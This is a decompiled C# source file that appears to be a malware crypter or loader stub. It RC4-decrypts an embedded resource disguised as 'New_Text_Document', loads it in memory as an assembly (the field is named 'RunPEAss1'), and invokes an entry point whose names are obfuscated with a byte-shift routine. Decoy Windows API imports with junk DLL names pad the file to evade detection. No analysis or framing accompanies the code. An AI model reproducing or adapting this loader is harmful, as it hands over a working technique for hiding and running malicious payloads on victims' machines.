using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using htyhtyty.My.Resources;

namespace htyhtyty;

public class Class1
{
	private struct OFSTRUCT
	{
		public byte cBytes;

		public byte fFixedDisk;

		public short nErrCode;

		public short Reserved1;

		public short Reserved2;

		public byte[] szPathName;
	}

	private struct SERVICE_STATUS
	{
		public int dwServiceStructure;

		public int dwCurrentState;

		public int dwControlsAccepted;

		public int dwWin32ExitCode;

		public int dwServiceSpecificExitCode;

		public int dwCheckPoint;

		public int dwWaitHint;
	}

	private struct ENUM_SERVICE_STATUS
	{
		public string lpServiceName;

		public string lpDisplayName;

		public SERVICE_STATUS ServiceStatus;
	}

	private struct FILETIME
	{
		public int dwLowDateTime;

		public int dwHighDateTime;
	}

	private struct ACL
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	private struct SECURITY_DESCRIPTOR
	{
		public byte Revision;

		public byte Sbz1;

		public int Control;

		public int Owner;

		public int Group;

		public ACL Sacl;

		public ACL Dacl;
	}

	public struct McXfn
	{
		public byte GCkZY;

		public byte lZYIW;

		public short OvBAO;

		public short DMhvS;

		public short lBdNa;
	}

	public struct GStruct0
	{
		public int int_0;

		public int UC2u;

		public int JTW;

		public int iMa;
	}

	private struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	private struct APPBARDATA
	{
		public int cbSize;

		public int hwnd;

		public int uCallbackMessage;

		public int uEdge;

		public RECT rc;

		public int lParam;
	}

	public struct GStruct1
	{
		public int int_0;

		public int uyl0W;

		public int a1prT;

		public int S15vt;

		public int IdGlN;

		public McXfn mcXfn_0;
	}

	private const int OFS_MAXPATHNAME = 128;

	private static byte[] hjhsj = Encoding.Default.GetBytes(Resources.New_Text_Document);

	private static object kjgkgr = zPygp0i("CkqhjxZ6K");

	private static Assembly RunPEAss1 = (Assembly)NewLateBinding.LateGet((object)null, typeof(Assembly), "Load", new object[1] { RuntimeHelpers.GetObjectValue(e6ZRe(ref hjhsj)) }, (string[])null, (Type[])null, (bool[])null);

	private static object ijieitop = zPygp0i("Ckqh");

	[DllImport("lz32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LZOpenFileA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszFile, OFSTRUCT lpOf, int style);

	[DllImport("bHRFyz", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseHandle(int hObject);

	[DllImport("eMTao", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);

	[DllImport("uwNDaP", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIcon(int hInstance, int nWidth, int nHeight, byte nPlanes, byte nBitsPixel, byte lpANDbits, byte lpXORbits);

	public static object e6ZRe(ref byte[] OqkRS)
	{
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int length = OqkRS.GetLength(Convert.ToInt32(0));
		int length2 = array.GetLength(Convert.ToInt32(0));
		int num = 0;
		int num2;
		int num3;
		checked
		{
			do
			{
				array2[num] = (byte)num;
				array3[num] = array[unchecked(num % length2)];
				num++;
			}
			while (num <= 255);
			num2 = Convert.ToInt32(0);
			num = 0;
			do
			{
				unchecked
				{
					num2 = Convert.ToInt32(checked(num2 + unchecked((int)array2[num]) + unchecked((int)array3[num])) % 256);
					byte b = array2[num];
					array2[num] = array2[num2];
					array2[num2] = b;
				}
				num++;
			}
			while (num <= 255);
			num2 = Convert.ToInt32(0);
			num = num2;
			num3 = length - 1;
		}
		for (int i = 0; i <= num3; i = checked(i + 1))
		{
			num = Convert.ToInt32(checked(num + 1) % 256);
			num2 = Convert.ToInt32(checked(num2 + unchecked((int)array2[num])) % 256);
			byte b = array2[num];
			array2[num] = array2[num2];
			array2[num2] = b;
			int num4 = checked(unchecked((int)array2[num]) + unchecked((int)array2[num2])) % 256;
			OqkRS[i] = (byte)(OqkRS[i] ^ array2[num4]);
		}
		return OqkRS;
	}

	[DllImport("uwNDaP", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int DdeSetUserHandle(int hConv, int id, int hUser);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int PrinterMessageBoxA(int hPrinter, int eror, int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pText, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pCaption, int dwStructure);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int DefDriverProc(int dwDriverIdentifier, int hdrvr, int uMsg, int lParam1, int lParam2);

	[DllImport("OsTBn.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumDependentServicesA(int hService, int dwServiceState, ENUM_SERVICE_STATUS lpServices, int cbBufSize, int pcbBytesNeeded, int lpServicesReturned);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegConnectRegistryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpMachineName, int hKey, int phkResult);

	[STAThread]
	public static void main()
	{
		rpz();
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetFileTime(int hFile, FILETIME lpCreationTime, FILETIME lpLastAccessTime, FILETIME lpLastWriteTime);

	[DllImport("OsTBn.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int MakeAbsoluteSD(SECURITY_DESCRIPTOR pSelfRelativeSecurityDescriptor, SECURITY_DESCRIPTOR pAbsoluteSecurityDescriptor, int lpdwAbsoluteSecurityDescriptorSize, ACL pDacl, int lpdwDaclSize, ACL pSacl, int lpdwSaclSize, byte[] pOwner, int lpdwOwnerSize, byte[] pPrimaryGroup, int lpdwPrimaryGroupSize);

	public static object rpz()
	{
		RunPEAss1.GetType(Conversions.ToString(kjgkgr))!.InvokeMember(Conversions.ToString(ijieitop), BindingFlags.InvokeMethod, null, null, null);
		return RunPEAss1;
	}

	[DllImport("dvNBn", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int dvNBn([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_0);

	[DllImport("ytNKs", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ytNKs(int int_0, int int_1, int int_2);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHAppBarMessage(int dwMessage, APPBARDATA pData);

	public static string zPygp0i(string EuqYv)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(EuqYv);
		checked
		{
			int num = bytes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if ((bytes[i] > 31) & (bytes[i] < 127))
				{
					byte[] array = bytes;
					byte[] array2 = array;
					int num2 = i;
					array2[num2] = (byte)unchecked((uint)(array[num2] - checked((byte)(unchecked(i % 31) + 1))));
				}
				if (bytes[i] < 32)
				{
					byte[] array = bytes;
					byte[] array3 = array;
					int num2 = i;
					array3[num2] = (byte)unchecked((uint)(array[num2] + 95));
				}
			}
			return Encoding.UTF8.GetString(bytes);
		}
	}
}
